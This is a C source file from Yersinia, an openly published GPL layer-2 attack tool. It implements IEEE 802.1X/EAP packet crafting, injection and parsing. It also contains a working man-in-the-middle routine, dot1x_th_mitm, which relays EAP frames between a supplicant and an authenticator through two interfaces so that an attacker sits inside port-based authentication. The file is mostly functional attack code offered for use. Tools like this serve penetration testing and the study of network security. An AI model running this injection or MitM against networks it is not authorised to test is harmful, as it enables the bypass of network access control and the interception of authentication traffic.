/* dot1x.c
 * Implementation and attacks for IEEE 802.1X
 *
 * Yersinia
 * By David Barroso <tomac@yersinia.net> and Alfredo Andres <slay@yersinia.net>
 * Copyright 2005, 2006, 2007 Alfredo Andres and David Barroso
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

#ifndef lint
static const char rcsid[] = 
       "$Id :$";
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#define _REENTRANT

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>       

#ifdef HAVE_NETINET_IN_SYSTM_H
#include <netinet/in_systm.h>
#else
#ifdef HAVE_NETINET_IN_SYSTEM_H
#include <netinet/in_system.h>
#endif
#endif

#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <time.h>

#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifdef HAVE_STRING_H
#include <string.h>
#endif

#ifdef HAVE_STRINGS_H
#include <strings.h>
#endif

#ifdef HAVE_BSTRING_H
#include <bstring.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_PTHREAD_H
#include <pthread.h>
#endif

#include <stdarg.h>

#include "dot1x.h"


void
dot1x_register(void)
{
   protocol_register(PROTO_DOT1X, "802.1X", "IEEE 802.1X", "dot1x", 
         sizeof(struct dot1x_data), dot1x_init_attribs, dot1x_learn_packet,
         dot1x_get_printable_packet, dot1x_get_printable_store,
         dot1x_load_values, dot1x_attack,
         dot1x_update_field, 
         dot1x_features, dot1x_comm_params, SIZE_ARRAY(dot1x_comm_params), 
         NULL, 0, NULL, dot1x_init_comms_struct, PROTO_VISIBLE, dot1x_end);
}

/*
 * Inicializa la estructura que se usa para relacionar el tmp_data
 * de cada nodo con los datos que se sacaran por pantalla cuando
 * se accede al demonio de red.
 * Teoricamente como esta funcion solo se llama desde term_add_node()
 * la cual, a su vez, solo es llamada al tener el mutex bloqueado por
 * lo que no veo necesario que sea reentrante. (Fredy). 
 */
int8_t
dot1x_init_comms_struct(struct term_node *node)
{
    struct dot1x_data *dot1x_data;
    void **comm_param;
 
    comm_param = (void *)calloc(1,sizeof(void *)*SIZE_ARRAY(dot1x_comm_params));
    
    if (comm_param == NULL)
    {
       thread_error("dot1x_init_commands_struct calloc error",errno);
       return -1;
    }

    dot1x_data = node->protocol[PROTO_DOT1X].tmp_data;
    
    node->protocol[PROTO_DOT1X].commands_param = comm_param;
    
    comm_param[DOT1X_SMAC]     = &dot1x_data->mac_source;
    comm_param[DOT1X_DMAC]     = &dot1x_data->mac_dest;
    comm_param[DOT1X_VER]      = &dot1x_data->version; 
    comm_param[DOT1X_TYPE]     = &dot1x_data->type; 
    comm_param[DOT1X_EAP_CODE] = &dot1x_data->eap_code;
    comm_param[DOT1X_EAP_ID]   = &dot1x_data->eap_id; 
    comm_param[DOT1X_EAP_TYPE] = &dot1x_data->eap_type; 
    comm_param[DOT1X_EAP_INFO] = &dot1x_data->eap_info; 
    comm_param[8] = NULL; 
    comm_param[9] = NULL; 
    
    return 0;
}



void
dot1x_th_send(void *arg)
{
    struct attacks *attacks=NULL;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dot1x_th_send pthread_sigmask()",errno);
       dot1x_th_send_exit(attacks);
    }

    dot1x_send(attacks);
    
    dot1x_th_send_exit(attacks);
}


int8_t
dot1x_send(struct attacks *attacks)
{
    libnet_ptag_t t;
    libnet_t *lhandler;
    int32_t sent;
    int32_t payload_size=0;
    struct dot1x_data *dot1x_data;
    struct eap_header *eap_hdr;
    u_int8_t *payload=NULL, *cursor;
    dlist_t *p;
    struct interface_data *iface_data;
    struct interface_data *iface_data2;
    
    dot1x_data = attacks->data;

    dot1x_data->len = 4;
    
    if (dot1x_data->len >= sizeof(struct eap_header))
    {
        write_log(0,"Payload = %d + 1 + 4\n",dot1x_data->eap_info_len);
        payload = (u_int8_t *)calloc(1,dot1x_data->eap_info_len+1+4);
        if (payload == NULL)
        {
            thread_error("dot1x_send calloc()",errno);
            return -1;
        }
        
        eap_hdr = (struct eap_header *)payload;
        
        eap_hdr->code = dot1x_data->eap_code;
        eap_hdr->id   = dot1x_data->eap_id;
        
        cursor = (u_int8_t *)(eap_hdr+1);
        *cursor = dot1x_data->eap_type;
        if (dot1x_data->eap_info_len)
           memcpy((void *)(cursor+1),dot1x_data->eap_info,dot1x_data->eap_info_len);
        
        switch(dot1x_data->eap_code)
        {
           case DOT1X_EAP_RESPONSE:
              if (dot1x_data->eap_type == 0x01) /* Notification */
              {
                 dot1x_data->len = sizeof(struct eap_header) + 1 + dot1x_data->eap_info_len;
                 eap_hdr->len = htons(sizeof(struct eap_header) + 1 + dot1x_data->eap_info_len);
                 payload_size = sizeof(struct eap_header) + 1 + dot1x_data->eap_info_len;
              }
              else
              {
                 dot1x_data->len = sizeof(struct eap_header) + 1;
                 eap_hdr->len = htons(sizeof(struct eap_header)+1);
                 payload_size = sizeof(struct eap_header) + 1;
              } 
           break;

           case DOT1X_EAP_REQUEST:
                 dot1x_data->len = sizeof(struct eap_header) + 1;
                 eap_hdr->len = htons(sizeof(struct eap_header)+1);
                 payload_size = sizeof(struct eap_header) + 1;
           break;

           default:
                dot1x_data->len = sizeof(struct eap_header);
                eap_hdr->len = htons(sizeof(struct eap_header));
                payload_size = sizeof(struct eap_header);
           break;
        }
    }

write_log(0,"Antes envio payload=%p  psize=%d  dot1x_data->len=%d\n",payload,payload_size,dot1x_data->len);
    
    for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p)) 
    {
       iface_data = (struct interface_data *) dlist_data(p);
            lhandler = iface_data->libnet_handler;

            t = libnet_build_802_1x(
                   dot1x_data->version, 
                   dot1x_data->type, 
                   dot1x_data->len, 
                   payload, 
                   payload_size, 
                   lhandler, 
                   0);

            if (t == -1)
            {
                thread_libnet_error("Can't build 802.1x header",lhandler);
                libnet_clear_packet(lhandler);
                if (payload)
                   free(payload);
                return -1;
            }

           t = libnet_build_ethernet(
                 dot1x_data->mac_dest,    /* ethernet destination */
                 dot1x_data->mac_source, /* ethernet source */
                 ETHERTYPE_EAP,          /* protocol type */
                 NULL,                   /* payload */
                 0,                      /* payload size */
                 lhandler,               /* libnet handle */
                 0);                     /* libnet id */
           if (t == -1)
           {
                thread_libnet_error("Can't build Ethernet_II header",lhandler);
                libnet_clear_packet(lhandler);
                if (payload)
                   free(payload);
                return -1;
           }

            /*
             *  Write it to the wire.
             */
            sent = libnet_write(lhandler);

            if (sent == -1) {
                thread_libnet_error("libnet_write error", lhandler);
                libnet_clear_packet(lhandler);
                if (payload)
                   free(payload);
                return -1;
            }

            libnet_clear_packet(lhandler);
            protocols[PROTO_DOT1X].packets_out++;
            iface_data2 = interfaces_get_struct(iface_data->ifname);
            iface_data2->packets_out[PROTO_DOT1X]++;
    }

    if (payload)
       free(payload);    

    return 0;
}




void
dot1x_th_send_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


/*
 * 802.1X MitM simple attack.
 * You'll need 2 network interfaces, 1 attached 
 * to the supplicant device and the other attached
 * to the authenticator device.
 */
void
dot1x_th_mitm(void *arg)
{
    struct attacks *attacks=NULL;
    struct attack_param *param;
    sigset_t mask;
    struct dot1x_data *dot1x_data;
    struct pcap_pkthdr header;
    struct libnet_802_3_hdr *ether;
    struct timeval now;
    struct dot1x_mitm_ifaces mitm_ifaces;
    struct interface_data *iface;
    dlist_t *p;
    u_int8_t *packet;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dot1x_th_mitm pthread_sigmask()",errno);
       dot1x_th_mitm_exit(attacks);
    }

    dot1x_data = attacks->data;

    param = attacks->params;

    p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, param[DOT1X_MITM_IFACE_AUTH].value);
    mitm_ifaces.auth = (struct interface_data *) dlist_data(p);

    p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, param[DOT1X_MITM_IFACE_SUPP].value);
    mitm_ifaces.supp = (struct interface_data *) dlist_data(p);

    if (!mitm_ifaces.auth || !mitm_ifaces.supp)
    {
       if (!mitm_ifaces.auth)
          write_log(0,"Ooops!! Interface %s not existent!!\n",param[DOT1X_MITM_IFACE_AUTH].value);
       else
          write_log(0,"Ooops!! Interface %s not existent!!\n",param[DOT1X_MITM_IFACE_SUPP].value);
       write_log(0," Have you enabled the interface? Sure?...\n");
       dot1x_th_mitm_exit(attacks);
    }
    
    gettimeofday(&now,NULL);
    
    header.ts.tv_sec = now.tv_sec;
    header.ts.tv_usec = now.tv_usec;

    if ((packet = calloc(1, SNAPLEN)) == NULL)
            dot1x_th_mitm_exit(attacks);

    /* Get Authenticator MAC address... */
    
    interfaces_get_packet(attacks->used_ints, mitm_ifaces.auth, 
                           &attacks->attack_th.stop, &header, packet,
                           PROTO_DOT1X, NO_TIMEOUT);
    if (attacks->attack_th.stop)
    {
        free(packet);
        dot1x_th_mitm_exit(attacks);
    }
       
    ether = (struct libnet_802_3_hdr *) packet;

    write_log(0, " Authenticator MAC = %02X:%02X:%02X:%02X:%02X:%02X\n",
        ether->_802_3_shost[0], ether->_802_3_shost[1], ether->_802_3_shost[2],
        ether->_802_3_shost[3], ether->_802_3_shost[4], ether->_802_3_shost[5]);

    memcpy((void *)mitm_ifaces.mac_auth,(void *)ether->_802_3_shost,6);

    /* Get supplicant MAC address */

    interfaces_get_packet(attacks->used_ints, mitm_ifaces.supp, 
                           &attacks->attack_th.stop, &header, packet,
                           PROTO_DOT1X, NO_TIMEOUT);
    if (attacks->attack_th.stop)
    {
        free(packet);
        dot1x_th_mitm_exit(attacks);
    }
           
    ether = (struct libnet_802_3_hdr *) packet;

    write_log(0, " Supplicant MAC = %02X:%02X:%02X:%02X:%02X:%02X\n",
        ether->_802_3_shost[0], ether->_802_3_shost[1], ether->_802_3_shost[2],
        ether->_802_3_shost[3], ether->_802_3_shost[4], ether->_802_3_shost[5]);

    memcpy((void *)mitm_ifaces.mac_supp,(void *)ether->_802_3_shost,6);


    /* Ok... Now start the funny bridging side... */
    while(!attacks->attack_th.stop)
    {
        iface = interfaces_get_packet(attacks->used_ints, 
                                      NULL, 
                                      &attacks->attack_th.stop, 
                                      &header, 
                                      packet,
                                      PROTO_DOT1X, 
                                      NO_TIMEOUT);
        if (attacks->attack_th.stop)
            break;

        ether = (struct libnet_802_3_hdr *) packet;
        
        /* Authenticator interface? */
        if (iface->libnet_handler == mitm_ifaces.auth->libnet_handler)
        {
           if (!memcmp(mitm_ifaces.mac_supp,ether->_802_3_shost,6) )
              continue; /* Oops!! Its our packet... */
                              
           dot1x_send_raw(mitm_ifaces.supp, (packet+LIBNET_802_3_H), (header.len-LIBNET_802_3_H),  
                          mitm_ifaces.mac_auth, 
                          mitm_ifaces.mac_supp);
           continue;
        }
        
        /* Supplicant interface? */
        if (iface->libnet_handler == mitm_ifaces.supp->libnet_handler)
        {
           if (!memcmp(mitm_ifaces.mac_auth,ether->_802_3_shost,6) )
              continue; /* Oops!! Its our packet... */

           dot1x_send_raw(mitm_ifaces.auth, (packet+LIBNET_802_3_H), (header.len-LIBNET_802_3_H), 
                          mitm_ifaces.mac_supp, 
                          mitm_ifaces.mac_auth);
           continue;
        }
    } 
    
    free(packet);
    
    dot1x_th_mitm_exit(attacks);
}




int8_t
dot1x_send_raw(struct interface_data *iface, u_int8_t *payload, u_int16_t len,
               u_int8_t *mac_source, u_int8_t *mac_dest)
{
    libnet_ptag_t t;
    int32_t sent;

    t = libnet_build_ethernet(
         mac_dest,           /* ethernet destination */
         mac_source,         /* ethernet source */
         ETHERTYPE_EAP,      /* protocol type */
         payload,            /* payload */
         len,                /* payload size */
         iface->libnet_handler,    /* libnet handle */
         0);                 /* libnet id */
    if (t == -1)
    {
        thread_libnet_error("Can't build Ethernet_II header",iface->libnet_handler);
        libnet_clear_packet(iface->libnet_handler);
        return -1;
    }

    sent = libnet_write(iface->libnet_handler);

    if (sent == -1) {
        thread_libnet_error("libnet_write error", iface->libnet_handler);
        libnet_clear_packet(iface->libnet_handler);
        return -1;
    }

    libnet_clear_packet(iface->libnet_handler);
    protocols[PROTO_DOT1X].packets_out++;
    iface->packets_out[PROTO_DOT1X]++;

    return 0;
}


void
dot1x_th_mitm_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


int8_t
dot1x_init_attribs(struct term_node *node)
{
    struct dot1x_data *dot1x_data;

    dot1x_data = node->protocol[PROTO_DOT1X].tmp_data;

    attack_gen_mac(dot1x_data->mac_source);

    dot1x_data->mac_source[0] &= 0x0E; 
    
    parser_vrfy_mac(DOT1X_DFL_MAC_DST,dot1x_data->mac_dest);

    dot1x_data->type     = DOT1X_DFL_TYPE; 
    dot1x_data->version  = DOT1X_DFL_VER; 
    dot1x_data->eap_code = DOT1X_DFL_EAP_CODE;
    dot1x_data->eap_id   = DOT1X_DFL_EAP_ID; 
    dot1x_data->eap_type = DOT1X_DFL_EAP_TYPE;
    
    memcpy(dot1x_data->eap_info,DOT1X_DFL_EAP_INFO,sizeof(DOT1X_DFL_EAP_INFO)-1);
    
    dot1x_data->eap_info_len = sizeof(DOT1X_DFL_EAP_INFO)-1;
    
    dot1x_data->len = dot1x_data->eap_info_len + 1 + sizeof(struct eap_header);
    
    return 0;
}


int8_t
dot1x_learn_packet(struct attacks *attacks, char *iface, u_int8_t *stop, void *data, struct pcap_pkthdr *header)
{
    struct dot1x_data *dot1x_data;
    struct pcap_data pcap_aux;
    u_int8_t *packet, got_802_1x_pkt = 0;
    u_int16_t *cursor;
    dlist_t *p;
    struct interface_data *iface_data;
    
    dot1x_data = data;

    if ((packet = calloc(1, SNAPLEN)) == NULL)
        return -1;

    if (iface) {
       p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, iface);
       if (!p)
          return -1;
       iface_data = (struct interface_data *) dlist_data(p);
    } 
    else
       iface_data = NULL;

    while (!got_802_1x_pkt && !(*stop))
    {
        interfaces_get_packet(attacks->used_ints, iface_data, stop, header, packet, PROTO_DOT1X, NO_TIMEOUT);
           
        if (*stop)
        {
            free(packet);
            return -1;
        }

        cursor = (u_int16_t *)(packet + 12);

        pcap_aux.header = header;
        pcap_aux.packet = packet;
                                                                                          
        if (!dot1x_load_values((struct pcap_data *)&pcap_aux, dot1x_data))
           got_802_1x_pkt = 1;
        
    } /* While got */

    free(packet);

    return 0;
}


/* 
 * Load values from packet to data.
 * At the moment this function is called only 
 * from ncurses-gui.c
 */
int8_t
dot1x_load_values(struct pcap_data *data, void *values)
{
    struct libnet_802_3_hdr *ether;
    struct dot1x_data *dot1x;
    struct dot1x_header *dot1x_hdr;
    struct eap_header *eap_hdr;
    u_int8_t *cursor;

    dot1x = (struct dot1x_data *)values;
    if (data->header->caplen < (14+4) ) /* Undersized packet!! */
       return -1;
       
    ether = (struct libnet_802_3_hdr *) data->packet;

    /* Source MAC */
    memcpy(dot1x->mac_source, ether->_802_3_shost, ETHER_ADDR_LEN);
    /* Destination MAC */
    memcpy(dot1x->mac_dest, ether->_802_3_dhost, ETHER_ADDR_LEN);
    
    dot1x_hdr = (struct dot1x_header *) (data->packet + LIBNET_802_3_H);
    
    dot1x->version = dot1x_hdr->version;
    dot1x->type    = dot1x_hdr->type;
    dot1x->len     = ntohs(dot1x_hdr->len);

    /* Vrfy minimal length!! */
    if (dot1x->type == DOT1X_TYPE_EAP)
    {
        eap_hdr = (struct eap_header *)(dot1x_hdr+1);
        dot1x->eap_code = eap_hdr->code;
        dot1x->eap_id   = eap_hdr->id;
        dot1x->eap_len  = ntohs(eap_hdr->len);
        /* Vrfy len!! */
        if ( (dot1x->eap_code == DOT1X_EAP_RESPONSE) &&
             (dot1x->eap_len > 4) )
        {
            cursor = (u_int8_t *)(eap_hdr+1);
            if (*cursor == DOT1X_EAP_IDENTITY)
            {
               memset(dot1x->eap_info,0,MAX_EAP_INFO);
               dot1x->eap_info_len = 0;
               /* Vrfy if INFO is within the boundaries!! */
               if ( (dot1x->eap_len-5) <= MAX_EAP_INFO)
               {
                  memcpy(dot1x->eap_info,(cursor+1),(dot1x->eap_len-5));
                  dot1x->eap_info_len = dot1x->eap_len-5;
               }
               else
               {
                  memcpy(dot1x->eap_info,(cursor+1),MAX_EAP_INFO);
                  dot1x->eap_info_len = MAX_EAP_INFO;
               }
               return 0;
            }
        }
    }
    
    memset(dot1x->eap_info,0,MAX_EAP_INFO);
    dot1x->eap_info_len = 0;

    return 0;
}



/* 
 * Return formated strings of each 802.1X field
 */
char **
dot1x_get_printable_packet(struct pcap_data *data)
{
    struct libnet_802_3_hdr *ether;
    struct dot1x_header *dot1x_hdr;
    struct eap_header *eap_hdr;
    u_int8_t *cursor;
    char **field_values;

    if (data && (data->header->caplen < (14+4)) ) /* Undersized packet!! */
       return NULL;

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_DOT1X].nparams, protocols[PROTO_DOT1X].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

    ether = (struct libnet_802_3_hdr *) data->packet;

    /* Source MAC */
    snprintf(field_values[DOT1X_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
       ether->_802_3_shost[0], ether->_802_3_shost[1], ether->_802_3_shost[2],
       ether->_802_3_shost[3], ether->_802_3_shost[4], ether->_802_3_shost[5]);
    /* Destination MAC */
    snprintf(field_values[DOT1X_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
       ether->_802_3_dhost[0], ether->_802_3_dhost[1], ether->_802_3_dhost[2],
       ether->_802_3_dhost[3], ether->_802_3_dhost[4], ether->_802_3_dhost[5]);
    
    dot1x_hdr = (struct dot1x_header *) (data->packet + LIBNET_802_3_H);

    /* Version */
    snprintf(field_values[DOT1X_VER],  3, "%02X", dot1x_hdr->version);
    snprintf(field_values[DOT1X_TYPE], 3, "%02X", dot1x_hdr->type);
 
    /* Vrfy minimal length!! */
    if (dot1x_hdr->type == DOT1X_TYPE_EAP)
    {
        eap_hdr = (struct eap_header *)(dot1x_hdr+1);
        snprintf(field_values[DOT1X_EAP_CODE],3, "%02X", eap_hdr->code);
        snprintf(field_values[DOT1X_EAP_ID],  3, "%02X", eap_hdr->id);
        
        /* Vrfy len!! eap_hdr->len */
        if ( (eap_hdr->code == DOT1X_EAP_RESPONSE) &&
             (eap_hdr->len > 4) )
        {
            cursor = (u_int8_t *)(eap_hdr+1);
            snprintf(field_values[DOT1X_EAP_TYPE], 3, "%02X", *cursor);
            if (*cursor == DOT1X_EAP_IDENTITY)
            {
               /* Vrfy if INFO is within the boundaries!! */
               if ( (eap_hdr->len-5) < 30)
               {
                  memcpy(field_values[DOT1X_EAP_INFO],(cursor+1),(eap_hdr->len-5));
               }
               else
               {
                  memcpy(field_values[DOT1X_EAP_INFO],(cursor+1),30);
                  field_values[DOT1X_EAP_INFO][29] = '|';
                  field_values[DOT1X_EAP_INFO][30] = '\0';
               }
            }
        }
    }

    return (char **)field_values;    
}


char **
dot1x_get_printable_store(struct term_node *node)
{
    struct dot1x_data *dot1x_tmp;
    char **field_values;
    
    /* smac + dmac + double + vlan1 + priority + cfi1 + tpi1 + vlan2 +
     * priority2 + cfi2 + tpi3 + src + dst + proto + arp + vlan + null = 17
     */

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_DOT1X].nparams,
                                    protocols[PROTO_DOT1X].parameters)) == NULL)
    {
        write_log(0, "Error in calloc\n");
        return NULL;
    }

    if (node == NULL)
        dot1x_tmp = protocols[PROTO_DOT1X].default_values;
    else
        dot1x_tmp = (struct dot1x_data *) node->protocol[PROTO_DOT1X].tmp_data;

    /* Source MAC */
    snprintf(field_values[DOT1X_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
	    dot1x_tmp->mac_source[0], dot1x_tmp->mac_source[1],
	    dot1x_tmp->mac_source[2], dot1x_tmp->mac_source[3],
	    dot1x_tmp->mac_source[4], dot1x_tmp->mac_source[5]);

    /* Destination MAC */
    snprintf(field_values[DOT1X_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
        dot1x_tmp->mac_dest[0], dot1x_tmp->mac_dest[1], dot1x_tmp->mac_dest[2],
        dot1x_tmp->mac_dest[3], dot1x_tmp->mac_dest[4], dot1x_tmp->mac_dest[5]);

    /* Version */
    snprintf(field_values[DOT1X_VER],      3, "%02X", dot1x_tmp->version);

    snprintf(field_values[DOT1X_TYPE],     3, "%02X", dot1x_tmp->type);
    snprintf(field_values[DOT1X_EAP_CODE], 3, "%02X", dot1x_tmp->eap_code);
    snprintf(field_values[DOT1X_EAP_ID],   3, "%02X", dot1x_tmp->eap_id);
    snprintf(field_values[DOT1X_EAP_TYPE], 3, "%02X", dot1x_tmp->eap_type);

    memcpy(field_values[DOT1X_EAP_INFO], dot1x_tmp->eap_info, MAX_EAP_INFO);

    return (char **)field_values;
}


int8_t 
dot1x_update_field(int8_t state, struct term_node *node, void *value)
{
    struct dot1x_data *dot1x_data;
    
    if (node == NULL)
       dot1x_data = protocols[PROTO_DOT1X].default_values;
    else
       dot1x_data = node->protocol[PROTO_DOT1X].tmp_data;

    switch(state)
    {
        /* Source MAC */
        case DOT1X_SMAC:
            memcpy((void *)dot1x_data->mac_source, (void *)value, ETHER_ADDR_LEN);
        break;

        /* Destination MAC */
        case DOT1X_DMAC:
            memcpy((void *)dot1x_data->mac_dest, (void *)value, ETHER_ADDR_LEN);
        break;

        case DOT1X_VER:
            dot1x_data->version = *(u_int8_t *)value;
        break;

        case DOT1X_TYPE:
            dot1x_data->type = *(u_int8_t *)value;
        break;
        
        case DOT1X_EAP_CODE:
            dot1x_data->eap_code = *(u_int8_t *)value;
        break;
        
        case DOT1X_EAP_ID:
            dot1x_data->eap_id = *(u_int8_t *)value;
        break;
        
        case DOT1X_EAP_TYPE:
            dot1x_data->eap_type = *(u_int8_t *)value;
        break;
        
        default:
        break;
    }

    return 0;
}


int8_t
dot1x_end(struct term_node *node)
{
   return 0;
}
